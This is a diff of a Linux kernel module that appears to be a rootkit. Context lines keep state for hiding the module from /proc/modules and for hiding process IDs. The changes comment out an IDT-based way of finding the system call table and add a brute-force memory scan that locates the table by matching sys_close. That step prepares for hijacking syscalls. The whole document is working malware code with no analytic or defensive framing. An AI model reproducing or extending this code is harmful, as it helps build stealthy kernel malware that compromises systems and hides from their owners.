@@ -30,10 +30,15 @@
 #include <linux/vmalloc.h>
 #include <linux/fs.h>
 #include <linux/syscalls.h>
+#include <linux/unistd.h>
+#include <asm/syscall.h>
+
+MODULE_LICENSE("GPL");
 
 static struct list_head *prev_entry; /* Pointer to previous entry in proc/modules */
 static char pid_list[10][32];
 static int last_proc = -1;
+static unsigned long **_sys_call_table = NULL;
 
 static void hexdump(unsigned char* ptr, unsigned int length) {
   unsigned int i;
@@ -51,26 +56,56 @@ static void hexdump(unsigned char* ptr, unsigned int length) {
 }
 
 static void find_sctable(void) {
-  struct desc_ptr idtr;
-  gate_desc *idt_table;
-  gate_desc *system_call_gate;
-  unsigned long _system_call_off;
-  unsigned char *_system_call_ptr;
+//  struct desc_ptr idtr;
+//  gate_desc *idt_table;
+//  gate_desc *system_call_gate;
+//  unsigned long _system_call_off;
+//  unsigned char *_system_call_ptr;
+//
+//  unsigned int i;
+//  unsigned char *off;
+//
+//  asm ("sidt %0" : "=m" (idtr));
+//  printk("+ IDT is at %08x\n", idtr.address);
+//  idt_table = (gate_desc*) idtr.address;
+//  system_call_gate = &idt_table[0x80];
+//
+//  _system_call_off = gate_offset(*system_call_gate);
+//  _system_call_ptr = (unsigned char *) _system_call_off;
+//  printk("+ system_call is at %08x\n", _system_call_off);
+//  printk("+ system_call is at %08x\n", _system_call_ptr);
+//  hexdump(_system_call_ptr, 128);
+//
+//  off = _system_call_ptr;
+//  for(i = 0; i < 128; i++) {
+//    if (off[i] == 0xff && off[i+1] == 0x14 && (off[i+2] == 0xc5 || off[i+2] == 0x85))
+//      _sys_call_table = *(sys_call_ptr_t **)(off + i + 3);
+//  }
+//
+//  if (_sys_call_table == NULL)
+//    printk("+ System call table was not found");
+//  else {
+//    printk("+ System call table was found at %08x\n", _sys_call_table);
+//    printk("+ sys_close taken from sys_call_table %08x\n", *(_sys_call_table ));
+//  }
+//
+//  printk(" done ");
+  unsigned long **sctable;
+  unsigned long ptr;
 
-  unsigned int i;
-  unsigned char off;
-
-  asm ("sidt %0" : "=m" (idtr));
-  printk("+ IDT is at %08x\n", idtr.address);
-  idt_table = (gate_desc*) idtr.address;
-  system_call_gate = &idt_table[0x80];
-
-  _system_call_off = gate_offset(*system_call_gate);
-  _system_call_ptr = (unsigned char *) _system_call_off;
-  printk("+ system_call is at %08x\n", _system_call_off);
-  printk("+ system_call is at %08x\n", _system_call_ptr);
-  hexdump(_system_call_ptr, 128);
-
+  sctable = NULL;
+  for ( ptr = PAGE_OFFSET;
+      ptr < ULLONG_MAX;
+      ptr += sizeof(void *)) {
+    unsigned long *p;
+    p = (unsigned long *)ptr;
+    if (p[__NR_close] == (unsigned long) sys_close) {
+      sctable = (unsigned long **)p;
+      _sys_call_table = &sctable[0];
+      break;
+    }
+  }
+    printk("+ System call table was found at %08x\n", (unsigned long long)_sys_call_table);
 }
 
 static inline void memorize(void) {
